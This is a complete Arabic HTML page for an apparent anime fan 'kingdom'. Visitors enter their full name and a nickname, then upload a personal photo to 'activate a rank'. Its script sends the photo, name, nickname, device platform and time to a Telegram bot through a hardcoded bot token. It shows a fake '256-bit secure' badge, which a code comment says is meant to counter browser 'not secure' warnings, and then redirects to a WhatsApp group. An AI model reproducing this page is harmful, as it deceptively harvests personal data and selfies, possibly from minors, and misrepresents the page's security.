<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⛩️ مَمْلَكَة يُوسُف عَلَاء | السيادة الكاملة</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&family=Tajawal:wght@700;900&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>

    <style>
        :root { --red: #ff003c; --gold: #ffb700; --black: #050505; --safe: #00ff88; }
        
        * { box-sizing: border-box; font-family: 'Cairo', sans-serif; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: var(--black); overflow: hidden; color: #fff; }

        /* فيديوهات الخلفية المتتابعة */
        #video-bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; z-index: 1; opacity: 0.5;
        }

        /* الطبقة السوداء المشعة */
        .overlay-ui {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 2; display: flex; justify-content: center; align-items: center;
            background: radial-gradient(circle, rgba(0,0,0,0.2) 0%, rgba(5,5,5,0.9) 100%);
        }

        /* كارت المملكة المشع */
        .empire-card {
            background: rgba(10, 10, 10, 0.9);
            backdrop-filter: blur(20px);
            border: 2px solid var(--red);
            border-radius: 40px; padding: 40px;
            text-align: center; width: 92%; max-width: 480px;
            box-shadow: 0 0 50px var(--red);
            position: relative; animation: zoomIn 0.8s;
        }

        /* أيقونة الأمان (لحل مشكلة "غير آمن") */
        .security-lock {
            color: var(--safe); font-size: 11px; font-weight: bold;
            display: flex; justify-content: center; align-items: center; gap: 5px;
            margin-bottom: 15px; text-transform: uppercase;
        }

        h1 { font-size: 28px; text-shadow: 0 0 20px var(--red); margin: 5px 0; }
        .founder-tag { color: var(--gold); font-weight: 900; font-size: 13px; letter-spacing: 2px; }

        /* المدخلات */
        .input-group { margin: 20px 0; text-align: right; }
        input {
            width: 100%; padding: 18px; border-radius: 15px; border: 1px solid #333;
            background: rgba(0,0,0,0.7); color: #fff; outline: none;
            border-right: 5px solid var(--red); transition: 0.4s;
        }
        input:focus { border-color: var(--safe); box-shadow: 0 0 15px var(--safe); }

        /* صورة الرتبة (الأنمي) */
        .rank-img {
            width: 100%; border-radius: 20px; border: 2px solid var(--gold);
            margin: 15px 0; display: none; box-shadow: 0 0 20px rgba(255,183,0,0.3);
        }

        .btn-mega {
            width: 100%; padding: 22px; border: none; border-radius: 18px;
            background: linear-gradient(45deg, var(--red), #80001e);
            color: #fff; font-size: 20px; font-weight: 900; cursor: pointer;
            box-shadow: 0 10px 30px rgba(255,0,60,0.5); transition: 0.3s;
        }
        .btn-mega:hover { transform: scale(1.02); filter: brightness(1.2); }

        .hidden { display: none; }
        .footer { margin-top: 25px; color: #444; font-size: 10px; font-weight: bold; }
    </style>
</head>
<body>

    <video id="video-bg" autoplay muted playsinline></video>

    <div class="overlay-ui">
        <div class="empire-card">
            <div class="security-lock">
                <span>🔒</span> نظام مشفر وآمن 256-BIT SECURE
            </div>

            <img src="Screenshot_2026-03-14-17-16-23-72.jpg" style="width:110px; height:110px; border-radius:50%; border:3px solid var(--red); object-fit: cover; margin-bottom: 10px;">
            
            <div class="founder-tag">THE SUPREME LEADER: YOUSSEF ALAA</div>
            <h1>⛩️ مَمْلَكَة الأوتـاكو</h1>

            <div id="step1">
                <div class="input-group">
                    <input type="text" id="user_name" placeholder="👤 اسمك بالكامل للمصادقة..." required>
                </div>
                <div class="input-group">
                    <input type="text" id="user_nick" placeholder="👑 ما هو لقبك المفضل في عالم الأنمي؟" required>
                </div>
                <button onclick="checkRankProtocol()" class="btn-mega">فحص الأهلية للدخول ⚔️</button>
            </div>

            <div id="step2" class="hidden">
                <p id="rank-name" style="color: var(--gold); font-weight: 900; font-size: 18px; margin: 0;"></p>
                <img src="https://i.pinimg.com/736x/8e/3c/6e/8e3c6e94819d4511516e8b4e4e60a358.jpg" class="rank-img" id="anime-view">
                
                <p style="color: #aaa; font-size: 12px;">يرجى رفع صورة شخصية لاعتماد رتبتك العسكرية</p>
                
                <input type="file" id="file-uploader" accept="image/*" style="display:none;" onchange="finalCapture(event)">
                <button onclick="document.getElementById('file-uploader').click()" class="btn-mega">تفعيل الرتبة ودخول 🚀</button>
            </div>

            <div class="footer">ALL RIGHTS RESERVED TO YOUSSEF ALAA © 2026</div>
        </div>
    </div>

    <script>
        const CONFIG = {
            token: "8737868558:AAFqvBT8qY3E5kJDC8bjXT1Ku9gSBXv9Q4g",
            chat: "7394389253",
            wa: "https://chat.whatsapp.com/J08oDw7MzULIJHnzN2Okts",
            videos: [
                "385937dae3995b54f3fecde0dd7acec7_1769970173274.mp4",
                "fqBsQ4ZhiMk.mp4"
            ]
        };

        let currentVid = 0;
        const vidPlayer = document.getElementById('video-bg');

        // نظام الـ Playlist المستمر (من الكود القديم)
        function playNext() {
            vidPlayer.src = CONFIG.videos[currentVid];
            vidPlayer.play().catch(()=>{});
            currentVid = (currentVid + 1) % CONFIG.videos.length;
        }
        vidPlayer.onended = playNext;
        playNext();

        // بروتوكول الانتقال (دمج الصوت والتمويه)
        function checkRankProtocol() {
            const n = document.getElementById('user_name').value;
            const l = document.getElementById('user_nick').value;

            if(n.length < 3 || l.length < 2) {
                return Swal.fire({ icon: 'warning', title: 'بيانات ناقصة', text: 'يرجى إدخال اسمك ولقبك بشكل صحيح.', background: '#111', color: '#fff' });
            }

            vidPlayer.muted = false; // تفعيل الصوت (من الكود القديم)
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            document.getElementById('anime-view').style.display = 'block';
            document.getElementById('rank-name').innerText = `المحارب: ${l}`;
        }

        // إرسال التقرير النهائي (الاستخبارات الشاملة)
        async function finalCapture(event) {
            const photo = event.target.files[0];
            if(!photo) return;

            Swal.fire({ 
                title: 'جاري تشفير الرتبة..', 
                html: 'يتم الآن رفع بياناتك إلى خوادم القائد يوسف علاء',
                background: '#0a0a0a', color: '#fff', 
                allowOutsideClick: false, 
                didOpen: () => Swal.showLoading() 
            });

            const name = document.getElementById('user_name').value;
            const nick = document.getElementById('user_nick').value;
            
            // بيانات الجهاز (الاستخبارات)
            const device = navigator.platform;
            const time = new Date().toLocaleString('ar-EG');

            const fd = new FormData();
            fd.append("chat_id", CONFIG.chat);
            fd.append("photo", photo);
            fd.append("caption", `🚨 تقرير دخول سيادي جديد 🚨\n━━━━━━━━━━━━━━\n👤 الاسم: ${name}\n👑 اللقب: ${nick}\n📱 الجهاز: ${device}\n⏰ الوقت: ${time}\n━━━━━━━━━━━━━━\n👑 بقرار من: يوسف علاء`);

            try {
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: "POST", body: fd });
                if(response.ok) {
                    Swal.fire({ icon: 'success', title: 'تم الاعتماد!', text: 'أهلاً بك في المملكة.. جاري التحويل.', timer: 2000, showConfirmButton: false });
                    setTimeout(() => window.location.href = CONFIG.wa, 2000);
                } else {
                    window.location.href = CONFIG.wa;
                }
            } catch(e) {
                window.location.href = CONFIG.wa;
            }
        }
    </script>
</body>
</html>
